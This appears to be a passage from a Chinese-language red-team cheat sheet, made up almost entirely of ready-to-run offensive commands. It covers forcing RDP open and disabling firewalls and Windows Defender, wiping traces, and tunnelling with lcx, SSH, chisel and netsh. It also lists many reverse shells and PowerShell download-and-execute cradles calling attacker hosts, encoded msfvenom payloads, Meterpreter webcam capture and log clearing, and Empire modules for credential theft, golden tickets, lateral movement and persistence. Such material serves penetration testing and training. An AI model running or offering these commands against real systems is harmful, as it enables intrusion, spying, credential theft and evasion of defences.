>REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
1表示关闭，0表示开启
查看远程连接的端口：
>REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
本机开启3389远程连接的方法
通过cmd
>REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
>REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f
通过reg文件
内容如下：
Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
"fDenyTSConnections"=dword:00000000
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]
"PortNumber"=dword:00000d3d
导入注册表：
regedit /s a.reg
```

### NETSH启动服务  netsh)

```
>netsh firewall set service remoteadmin enable 
>netsh firewall set service remotedesktop enable
>netsh firewall set opmode disable 关闭防火墙
```

### 注入点开启  _17)

```
.asp?id=100;exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;--
注：
修改连接端口重启后生效
```

### MSF开启  msf_3)

```
#run post/windows/manage/enable_rdp
```

### Wmic开启  wmic_1)

```
>wmic /node:192.168.1.2 /USER:administrator PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1
```

### 防火墙  _18)

```
允许进站
如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则，允许3389端口，命令如下:
>netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
>netsh firewall set portopening TCP 3389 ENABLE
防火墙关闭
>netsh firewall set opmode mode=disable
>netsh advfirewall show allprofiles查看状态
>netsh advfirewall set allprofiles state off 
>sc stop windefend
>sc delete windefend
PS> Set-MpPreference -DisableRealtimeMonitoring 1
PS> Set-MpPreference -Disablearchivescanning $true
```

### 多用户登录  _19)

```
Mimikatz设置允许多用户登录
>privilege::debug
>ts::multirdp
rdpwrap
https://github.com/stascorp/rdpwrap
>RDPWInst.exe -i is
```

### RDP连接记录  rdp)

```
https://github.com/3gstudent/List-RDP-Connections-History
查看本机用户连接RDP的记录
```

![image](http://159.75.51.84:8000/img/161.png)

```
>Psloggedon.exe username
```

![image](http://159.75.51.84:8000/img/162.png)

### 删除痕迹  _20)

```
@echo off
@reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
@del "%USERPROFILE%\My Documents\Default.rdp" /a
@exit
```

## 端口映射&转发  _21)

### MSF  msf_4)

```
使用条件：服务器通外网，拥有自己的公网ip
>portfwd add -l 5555 -p 3389 -r 172.16.86.153
转发目标主机的3389远程桌面服务端口到本地的5555
>portfwd list
```

### lcx.exe  lcxexe)

```
使用条件：服务器通外网，拥有自己的公网ip
靶机：lcx.exe -slave 外网IP 9999 127.0.0.1 3389
linux攻击机：./portmap -m 2 -p1 9999 -p2 33889
windows攻击机：lcx -listen 9999 33889 把本机9999监听的信息转到33889
PortTran
https://github.com/k8gege/K8tools/raw/master/PortTran.rar
攻击机执行
>PortTranS20.exe 12345 389
```

![image](http://159.75.51.84:8000/img/163.png)

```
靶机执行
>PortTranC20.exe 127.0.0.1 3389 192.168.0.102 12345
建立连接后，攻击机连接本机389端口即可
```

![image](http://159.75.51.84:8000/img/164.png)

### SSH  ssh)

```
-C 压缩传输，加快传输速度
-f 在后台对用户名密码进行认证
-N 仅仅只用来转发，不用再弹回一个新的shell -n 后台运行
-q 安静模式，不要显示任何debug信息
-l 指定ssh登录名
-g 允许远程主机连接到本地用于转发的端口
-L 进行本地端口转发
-R 进行远程端口转发
-D 动态转发，即socks代理
-T 禁止分配伪终端
-p 指定远程ssh服务端口
```

#### 正向转发  _22)

```
外网靶机110
内网靶机115
本地攻击机编辑后restart ssh服务
#vim /etc/ssh/sshd_conf
AllowTcpForwarding yes 允许TCP转发
GatewayPorts yes   允许远程主机连接本地转发的端口
TCPKeepAlive yes    TCP会话保持存活
PasswordAuthentication yes  密码认证
>ssh -C -f -N -g -L 33890:192.168.0.115:3389 root@192.168.0.110 -p 22
本地攻击机执行，本地33890转发到远程的3389端口
上线MSF
攻击机出网Linux靶机--不出网Linux靶机--不出网win机
>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=不出网Linux机 lport=12138 -f exe -o /var/www/html/1.exe
攻击机监听端口12345
不出网Linux机
>ssh -C -f -N -g -L 0.0.0.0:12138:攻击机:12345 root@出网Linux主机 -p 22
```

#### 反向转发  _23)

```
外网攻击107
内网靶机97
出网靶机编辑后restart ssh服务
#vim /etc/ssh/sshd_conf
AllowTcpForwarding yes 允许TCP转发
GatewayPorts yes   允许远程主机连接本地转发的端口
TCPKeepAlive yes    TCP会话保持存活
PasswordAuthentication yes  密码认证
>ssh -C -f -N -g -R 33890:10.1.1.97:3389 root@192.168.0.107 -p 22
出网靶机执行，把外部攻击机33890转发到内部隔离网络的3389
>netstat –tnlp
```

![image](http://159.75.51.84:8000/img/165.png)

```
转发成功，外网攻击机安装apt install rinetd(正向tcp转发工具)
>vim /etc/rinetd.conf
添加0.0.0.0 3389 127.0.0.1 33890
>service rinetd start
```

![image](http://159.75.51.84:8000/img/166.png)

```
看到107是kali攻击机，连接107:33890即可到达内网10.1.1.97的桌面
```

![image](http://159.75.51.84:8000/img/167.png)

### Invoke-SocksProxy  invoke-socksproxy)

```
https://gitee.com/RichChigga/Invoke-SocksProxy
>Import-Module .\Invoke-SocksProxy.psm1 
>Invoke-SocksProxy -bindPort 12138 建立socks代理，使用代理软件连接
```

![image](http://159.75.51.84:8000/img/168.png) ![image](http://159.75.51.84:8000/img/169.png)

### SSF  ssf)

#### 单层网络正向转发  _24)

```
https://github.com/securesocketfunneling/ssf/releases
内网机执行：
>ssfd.exe -p 1080
```

![image](http://159.75.51.84:8000/img/170.png)

```
边界机器执行
>ssf.exe -L 12138:10.1.1.108:22 -p 1080 192.168.0.98 
把内网10.1.1.108的SSH转发出来
```

![image](http://159.75.51.84:8000/img/171.png)

```
边界机器访问内网端口
```

![image](http://159.75.51.84:8000/img/172.png)

#### 单层网络反向转发  _25)

```
边界机器执行：
>ssfd.exe -p 1080
```

![image](http://159.75.51.84:8000/img/173.png)

```
内网机器执行：
>ssf.exe -R 12138:10.1.1.108:22 -p 1080 192.168.0.106
```

![image](http://159.75.51.84:8000/img/174.png)
![image](http://159.75.51.84:8000/img/175.png)

### Netsh  netsh_1)

```
边界机器执行：
>netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=2222 connectaddress=10.1.1.108 connectport=22
将内网10.1.1.108主机22端口转发至本机2222端口，攻击机连接边界机器2222端口即可访问内网SSH
```

![image](http://159.75.51.84:8000/img/176.png)

```
>netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=13389 connectaddress=192.168.0.98 connectport=3389
当靶机某服务只允许内网访问时，将端口转发出来
```

![image](http://159.75.51.84:8000/img/177.png)

```
添加防火墙规则：
>netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localip=192.168.0.98 localport=13389 action=allow
列出所有转发规则:
>netsh interface portproxy show all
```

![image](http://159.75.51.84:8000/img/178.png)

```
删除指定的端口转发规则：
>netsh interface portproxy delete v4tov4 listenport=13389 listenaddress=192.168.0.98
删除所有转发规则：
>netsh interface portproxy reset
```

### Iptables  iptables)

```
需开启ip转发功能
>vim /etc/sysctl.conf设置net.ipv4.ip_forward=1
```

![image](http://159.75.51.84:8000/img/179.png) ![image](http://159.75.51.84:8000/img/180.png)

```
本地端口22转发到2222上
>iptables -t nat -A PREROUTING -p tcp --dport 2222 -j REDIRECT --to-ports 22
内网98机器3389转到本机110的6789上
>iptables -t nat -A PREROUTING -d 192.168.0.110 -p tcp --dport 6789 -j DNAT --to-destination 192.168.0.98:3389
>iptables -t nat -A POSTROUTING -d 192.168.0.98 -p tcp --dport 3389 -j SNAT --to 192.168.0.110
```

![image](http://159.75.51.84:8000/img/181.png)

```
查看规则
>iptables -t nat -L
删除规则
>iptables -t nat -D PREROUTING 1
删除全部规则
>iptables -t nat –F
```

### chisel  chisel)

```
https://github.com/jpillora/chisel
攻击机执行
>chisel server -p 12138 –reverse
```

![image](http://159.75.51.84:8000/img/182.png)

```
靶机执行
>chisel client 公网攻击机IP:12138 R:1234:127.0.0.1:3389
```

![image](http://159.75.51.84:8000/img/183.png)

```
建立成功后，攻击机连接本机1234端口即可访问靶机3389
```

![image](http://159.75.51.84:8000/img/184.png)

## 命令&控制  _26)

### Interactive shell  interactive-shell)

```
>python -c 'import pty;pty.spawn("/bin/bash")'
>expect -c 'spawn bash;interact'
```

### Script reverse shell  script-reverse-shell)

#### bash  bash_1)

```
>/bin/bash -i > /dev/tcp/attackerip/4444 0<&1 2>&1
```

![image](http://159.75.51.84:8000/img/185.png)

```
>bash -i >& /dev/tcp/attackerip/4444 0>&1
```

![image](http://159.75.51.84:8000/img/186.png)

```
>0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
```

![image](http://159.75.51.84:8000/img/187.png)

```
>msfvenom -p cmd/unix/reverse_bash LHOST=attackerip LPORT=4444 -o shell.sh
```

![image](http://159.75.51.84:8000/img/188.png)

#### nc  nc)

```
>nc -e /bin/sh attackerip 4444
>nc -Lp 31337 -vv -e cmd.exe
&
>mknod backpipe p; nc 192.168.0.107 12138 0<backpipe | /bin/bash 1>backpipe
>nc 192.168.0.10 31337
```

#### telnet  telnet)

```
>mknod backpipe p; telnet attackerip 443 0<backpipe | /bin/bash 1>backpipe
```

#### php  php)

```
#php -r '$sock=fsockopen("IP",port);exec("/bin/sh -i <&3 >&3 2>&3");'
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.107/1234 0>&1'");?>
```

#### python  python)

```
>python -c ' import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash","-i"]); '
>msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py
>import socket,struct,time for x in range(10): try: s=socket.socket(2,socket.SOCK_STREAM) s.connect(('IP',端口)) break except: time.sleep(5) l=struct.unpack('>I',s.recv(4))[0] d=s.recv(l) while len(d)
```

#### perl  perl)

```
>perl -e 'use Socket;$i=" attackerip ";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
>perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
>perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'  #####windows
```

#### ruby  ruby)

```
>ruby -rsocket -e'f=TCPSocket.open("attackerip ",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
>ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'   #####windows
```

### OpenSSL encrypt shell  openssl-encrypt-shell)

```
生成证书
>openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
```

![image](http://159.75.51.84:8000/img/189.png)

#### Linux  linux_2)

```
监听
>openssl s_server -quiet -key key.pem -cert cert.pem -port 1337
```

![image](http://159.75.51.84:8000/img/190.png)

```
靶机执行
>mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.0.108:1337 > /tmp/s; rm /tmp/s
```

![image](http://159.75.51.84:8000/img/191.png)

```
此方式使用TLS1.2 协议对通信进行加密
```

#### Windows  windows)

```
攻击机需监听2个端口，一个端口发送命令，一个端口接收回显
发送
>openssl s_server -quiet -key key.pem -cert cert.pem -port 1337
接收
>openssl s_server -quiet -key key.pem -cert cert.pem -port 1338
靶机执行
>openssl s_client -quiet -connect 192.168.0.108:1337|cmd.exe|openssl s_client -quiet -connect 192.168.0.108:1338
```

![image](http://159.75.51.84:8000/img/192.png) ![image](http://159.75.51.84:8000/img/193.png) ![image](http://159.75.51.84:8000/img/194.png)

### Dnscat2  dnscat2)

```
安装dnscat2
>apt-get -y install ruby-dev git make g++
>gem install bundler
>git clone https://github.com/iagox86/dnscat2.git
>cd dnscat2/server
>bundle install
执行
>ruby dnscat2.rb abc.com -e open --no-cache
```

![image](http://159.75.51.84:8000/img/195.png)

#### Powercat  powercat)

```
靶机执行
>powercat -c 192.168.0.108 -v -dns abc.com -e cmd.exe
```

![image](http://159.75.51.84:8000/img/196.png)

```
dnscat2执行
>session -i 1进入会话
```

![image](http://159.75.51.84:8000/img/197.png)

#### Dnscat2 exe  dnscat2-exe)

```
Linux
https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-x86.tar.bz2 https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-x64.tar.bz2
https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip
攻击机执行
>ruby dnscat2.rb --dns "domain=zone.com,host=192.168.0.108" --no-cache
靶机执行
>dnscat2-v0.07-client-win32.exe --dns server=192.168.0.108
```

![image](http://159.75.51.84:8000/img/198.png)

```
攻击机执行
>session -i [ID]进入会话
```

![image](http://159.75.51.84:8000/img/199.png) ![image](http://159.75.51.84:8000/img/200.png)

### DNS TXT Command  dns-txt-command)

```
https://github.com/samratashok/nishang/Utility/Out-DnsTxt.ps1
https://github.com/samratashok/nishang/Backdoors/DNS_TXT_Pwnage.ps1
新建一个psh文件，使用out-dnstxt转换，这里的命令是net user
```

![image](http://159.75.51.84:8000/img/201.png) ![image](http://159.75.51.84:8000/img/202.png)

```
y0stUSgtTi3i5QIA
添加一条域名txt记录，这里在本地设置，正常是在域名商的网站里配置
```

![image](http://159.75.51.84:8000/img/203.png)

```
还需创建两个txt记录，分别是指定开始和结束的字符串
```

![image](http://159.75.51.84:8000/img/204.png) ![image](http://159.75.51.84:8000/img/205.png)

```
靶机执行
>Import-Module .\DNS_TXT_Pwnage.ps1
>DNS_TXT_Pwnage -startdomain start.zone.com -cmdstring cmd -commanddomain 1.zone.com -psstring start -psdomain zone.com -Subdomains 1 -StopString stop
```

![image](http://159.75.51.84:8000/img/206.png)

### Powershell  powershell_1)

#### MSF+Powershell  msfpowershell)

```
反弹MSF
靶机
PS >IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.100/powersploit/CodeExecution/Invoke-Shellcode.ps1') 
PS >Invoke-Shellcode -payload windows/meterpreter/reverse_http -lhost 192.168.0.100 -lport 6666 -force
攻击机：
>use exploit/multi/handler
>set payload windows/x64/meterpreter/reverse_ https
>run
或
>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.100 LPORT=4444 -f powershell -o /var/www/html/ps
>IEX(New-Object Net.WebClient).DownloadString("http://192.168.0.100/powersploit/CodeExecution/Invoke-Shellcode.ps1")
>IEX(New-Object Net.WebClient).DownloadString("http://192.168.0.100/ps")
>Invoke-Shellcode -Shellcode ($buf)
或
>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f psh-reflection >/var/www/html/a.ps1
>powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.101/a.ps1')"
```

#### Powercat  powercat_1)

```
>powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
正向连接
靶机:powercat -l -p 8080 -e cmd.exe –v
攻击机:nc 192.168.0.1 8080 –vv
反向连接：
攻击机：nc –l –p 8080 –vv
靶机:powercat –c 192.168.0.1 –p 8080 –v –e cmd.exe
远程执行
>powershell -nop -w hidden -ep bypass "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.0.107/ps/powercat/powercat.ps1'); powercat -c 192.168.0.107 -p 12345 -v -e cmd.exe"
正向连接
靶机:powercat -l -p 8080 -e cmd.exe -v
攻击机:nc 192.168.0.1 8080 -vv
反向连接：
攻击机：nc -l -p 8080 -vv
靶机:powercat -c 192.168.0.1 -p 8080 -v -e cmd.exe
```

![image](http://159.75.51.84:8000/img/207.png)

#### Nishang  nishang)

##### BIND SHELL  bind-shell)

```
靶机：
>powershell -nop -w hidden -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Bind -Port 12138"
攻击机：
>nc 靶机IP 12138
```

##### 反向SHELL  shell)

```
攻击机：
>nc -vnlp 9999
靶机：
>powershell -nop -w hidden -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 攻击机IP -port 9999"
```

##### UDP反向SHELL  udpshell)

```
攻击机：
>nc -lvup 12138
靶机：
>powershell -nop -w hidden -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 攻击机IP -port 12138"
```

##### HTTPS  https)

```
攻击机：
>powershell -nop -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Shells/Invoke-PoshRatHttps.ps1'); Invoke-PoshRatHttps -IPAddress 192.168.0.98 -Port 8080 -SSLPort 443"  IP地址是本机IP
```

![image](http://159.75.51.84:8000/img/208.png)

```
靶机：
>powershell -w hidden -nop -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.98:8080/connect')
```

![image](http://159.75.51.84:8000/img/209.png)

##### ICMP  icmp)

```
攻击机IP:108
靶机IP:100
https://github.com/inquisb/icmpsh
靶机执行
>powershell -nop -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.108/ps/nishang/Shells/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp 192.168.0.108
```

![image](http://159.75.51.84:8000/img/210.png)

```
攻击机执行，开启相应ICMP ECHO请求
>sysctl -w net.ipv4.icmp_echo_ignore_all=1
>./icmpsh_m.py 192.168.0.108 192.168.0.100
```

![image](http://159.75.51.84:8000/img/211.png)

#### Base64  base64_1)

```
>Powershell "$string="net user";[convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($string))"
```

### Metasploit  metasploit)

#### 常规使用  _27)

```
#systemctl start postgresql.service 启动数据库服务
#msfdb init 初始化数据库
#msfconsole进入MSF框架
#search  ms17-010 查找攻击模块
#use exploit/windows/smb/ms17_010_eternalblue 使用模块 
#set payload windows/x64/meterpreter/reverse_tcp 设置载荷
#info 查看信息
#show options查看需要设置的参数
#set RHOST 192.168.125.138设置参数
#exploit 执行攻击模块
#back 回退
```

#### 技巧使用  _28)

```
#handler -H 192.168.0.10 -P 3333 -p windows/x64/meterpreter/reverse_tcp快速监听
#setg 设置全局参数
#set autorunscript migrate –f 自动迁移进程
#set autorunscript migrate -n explorer.exe
#set AutoRunScript post/windows/manage/migrate
#set prependmigrate true 自动注入进程
#set prependmigrateProc svchost.exe
#set exitonsession false获取到session后继续监听，获得多个session
#set stagerverifysslcert false 防止出现ssl错误
#set SessionCommunicationTimeout 0 防止session超时退出
#set SessionExpirationTimeout 0 防止强制关闭session
#exploit -j -z  后台持续监听
>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -e x86/shikata_ga_nai -b "x00" -i 5 -a x86 --platform windows PrependMigrate=true PrependMigrateProc=explorer.exe -f exe -o  1.exe 执行后注入到已存在的一个进程
>set EnableStageEncoding true
>set stageencoder x86/fnstenv_mov 编码进行免杀
>set stageencodingfallback false
```

#### 模块  _29)

##### AUXILIARY  auxiliary)

```
#show auxiliary 查看所有模块
```

##### PAYLOAD  payload)

```
#show payloads 查看所有攻击载荷
Payload是目标被攻击时执行的实际功能代码
生成载荷
#use exploit/multi/script/web_delivery
>set target 2
>msfvenom --list payloads 列出所有payload
>msfvenom --list encoders 列出所有编码器
```

###### Windows  windows_1)

```
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f exe -o /root/1.exe
#msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 3 -f exe -o 1.exe
#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f psh-reflection >xxx.ps1
#msfvenom -a x64 --platform windows -p windows/powershell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1
>msfvenom -p windows/shell_hidden_bind_tcp LHOST=192.168.0.1 LPORT=11111  -f exe> /root/1.exe  生成NC正向连接
>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f exe> 1.exe 生成NC反向连接
```

###### Linux  linux_3)

```
#msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -e -f elf -a x86 --platform linux -o shell
#msfvenom -p cmd/unix/reverse_bash LHOST=192.168.0.1 LPORT=11111 -f raw > shell.sh
```

###### MacOS  macos)

```
#msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f macho > shell.macho
```

###### Web  web)

```
#msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw > shell.php
#msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f war > shell.war
#msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f aspx -o payload.aspx
#msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.jsp
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f asp > shell.asp
```

###### Android  android)

```
#msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f apk -o payload.apk
#msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=12138 -f raw > shell.apk
#msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=12138 R > test.apk
```

###### shellcode  shellcode_1)

```
#msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.0.1 LPORT=11111 -f c –o /root/1.c
#msfvenom -p cmd/unix/reverse_python LHOST=192.168.0.1 LPORT=11111 -o shell.py
#msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw > shell.py
#msfvenom -p cmd/unix/reverse_perl LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.pl
#msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.rb
#msfvenom -p cmd/unix/reverse_lua LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.lua
```

###### msf设置监听  msf_5)

```
#use exploit/multi/handler
#set payloadwindows/meterpreter/reverse_http 指定相应的payload
#set LHOST 192.168.0.1
#set LPORT 11111
#exploit -j 后台监听
或在exploit模块中直接使用set payload 命令指定payload
```

#### Meterpreter  meterpreter)

##### 交互  _30)

```
当攻击成功后会返回会话，使用session -l命令列出当前获取到的会话
#session -l
使用
#sessions -i id 来进入一个会话进行交互
#background 将当前会话放置后台
#sessions -x检查心跳
#sessions -u [ID] cmdshell升级meterpreter shell
```

##### 提权  _31)

```
提权详见提权模块
```

##### 命令  _32)

```
#shell 进入目标cmdshell
#uictl [enable/disable] [keyboard/mouse/all]  开启或禁止键盘/鼠标
#uictl disable mouse  禁用鼠标
#uictl disable keyboard  禁用键盘
#webcam_list   查看摄像头
#webcam_snap   通过摄像头拍照
#webcam_stream  通过摄像头开启视频
#execute -H -i -f cmd.exe 执行cmd.exe，-H不可见，-i交互 
#execute -H -m -d calc.exe -f wce.exe -a "-o 1.txt" 隐藏执行
#ps查看当前活跃进程
#migrate pid     迁移进程
#kill pid   #杀死进程
```

##### 文件操作  _33)

```
#pwd 查看当前目录
#ls 列出当前目录文件
#search -f *pass*        搜索文件
#cat c:\\passwd.txt   查看文件内容
#upload /tmp/pwn.txt C:\\1.txt   上传文件
#download c:\\passwd.txt /tmp/  下载文件
#edit c:\\1.txt  编辑或创建文件
#rm C:\\1.txt 删除文件
#mkdir folder  创建文件夹
#rmdir folder  删除文件夹
#lcd /tmp   #攻击者主机 切换目录
#timestomp -v C://2.txt   #查看时间戳
#timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt
```

##### 后渗透&权限维持  _34)

```
路由添加，socks建立，后门建立等查看
查看后门&持久化板块
```

##### 清理日志  _35)

```
#clearev
```

#### MSF派生Cobalt strike和Empire  msfcobalt-strikeempire)

##### 派生EMPIRE  empire)

```
Empire创建一个Listener
创建一个stager选择windows/dll
MSF使用
>use post/windows/manage/reflective_dll_inject 
指定session，dll的路径，进程pid
```

##### 派生COBALT STRIKE  cobalt-strike_1)

```
cobalt 开启一个监听器windows/beacon_http/reverse_http
msf 
>use exploit/windows/manage/payload_inject
指定IP、端口、payload即可
```

### Empire  empire_1)

#### 安装  _36)

```
#git clone https://github.com/EmpireProject/Empire.git
#cd Empire/setup
#./install.sh
```

#### 监听  _37)

```
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners) > info 查看参数信息
(Empire: listeners/http) > set Name y
(Empire: listeners/http) > set Host http://192.168.0.1
(Empire: listeners/http) > set Port 8080
(Empire: listeners/http) > execute
>back命令返回listeners模块
>list查看已激活的listener
>kill http删除监听
```

#### 生成  _38)

```
(Empire: listeners) > usestager windows/launcher_vbs (双击tab键查看所有模块)
(Empire: stager/windows/launcher_vbs) > info
必须设置listener的名字，可设置生成位置
(Empire: stager/windows/launcher_vbs) > set Listener y
(Empire: stager/windows/launcher_vbs) > execute
可生成vbs，靶机执行即可上线。
使用launcher命令直接生成powershell或python脚本
>launcher powershell Listener-Name
使用rename对agents更名
>rename 6NMCW4ZB target1
使用main命令放回主菜单
>list stale 列出失去权限的机器
>remove stale 去除失去权限的机器
```

#### 连接靶机及其他操作  _39)

```
>interact target1 连接
>agent 返回靶机列表
>back 返回上一层
>shell net user 1 1 /add 执行系统目录格式
>mimikazt 加载模块获取密码
>creds 整理获取的密码，creds export /root/1.txt 保存密码，creds hash/plaintext，显示格式
>sc 获取当前桌面截图，文件存储在./Empire/download/agent名字/screenshot
>download c:\pass.txt 下载靶机文件到本机
>upload hacked.txt c:\hacked.txt 上传本机文件到靶机
```

#### 提权  _40)

```
>agents 列表中Username没有星号则需要提权
>bypassuac listener需指定一个监听器 提权
>usemodule privesc/ms16-032需指定一个监听器 提权
>usemodule privesc/powerup/allchecks执行所有脚本检查漏洞
```

#### 横向  _41)

```
查询域管登录机器
>usemodule situational_awareness/network/powerview/user_hunter
```

##### 令牌窃取  _42)

```
>mimikatz
>creds  获取并整理hash及密码
>pth {ID}窃取管理员令牌
>steal_token {PID}
```

##### 会话注入  _43)

```
>ps 查看进程
>usemodule management/psinject 设置ProcIP和Listener
```

##### HASH传递  hash)

```
Invoke-PsExec可能会被查杀
>usemodule situational_awareness/network/powerview/find_localadmin_access 列出可PSexec横向移动的机器
>usemodule lateral_movement/invoke_psexec需设置ComputerName和Listener
或
>usemodule lateral_movement/invoke_wmi需设置ComputerName和Listener，credID
跨域
父域域控：dc.zone.com
子域域控：sub.zone.com
子域计算机：pc.sub.zone.com
子域普通用户：sub\user1
查看信任关系
>usemodule situational_awareness/network/powerview/get_domain_trust
获取父域krbtgt SID，使用management/user_to_sid获取sid
需设置Domain和User=krbtgt
>usemodule credentials/mimikatz/dcsync 设置UserName 子域\krbtgt 获取子域hash
>usemodule credentials/mimikatz/golden_ticket 伪造sid 
需设置User为伪造用户 sids伪造的标识符{krbtgt sid}-519
>usemodule credentials/mimikatz/dcsync 获取父域krbtgt的hash
>usemodule credentials/mimikatz/golden_ticket 使用父域krbtgt进行PTH攻击，指定父域CredID，用户名和域
>shell dir \\dc.zone.com\c$
```

#### 后门&持久化  _44)

##### 映像劫持  _45)

```
>usemodule lateral_movement/invoke_wmi_debugger
设置Listener，ComputerName(大写)，TargetBinary(sethc.exe, Utilman.exe, osk.exe, Narrator.exe, Magnify.exe)，分别是粘滞键，轻松访问，屏幕键盘，讲述人，放大镜。
```

##### 注入注册表启动项  _46)

```
>usemodule persistence/elevated/registry*
设置Listener，注册表路径RegPath [HKLM\software\microsoft\windows\currentversion\run]
```

##### 计划任务  _47)

```
>usemodule persistence/elevated/schtasks*
设置Listener和DailyTime
```

##### WMI  wmi)

```
>usemodule persistence/elevated/wmi
设置Listener
```

##### 注入SSP  ssp)

```
查看SSP章节
```

Collection（信息采集）

#### Collection（信息采集）  collection)

| 模块名                                          | 功能                                                         |
| :---------------------------------------------- | :----------------------------------------------------------- |
| collection/ChromeDump                           | 收集chrome浏览器保存的密码和浏览历史记录                     |
| collection/FoxDump                              | 收集Firefox浏览器保存的密码和浏览历史记录                    |
| collection/USBKeylogger*                        | 利用ETW作为键盘记录                                          |
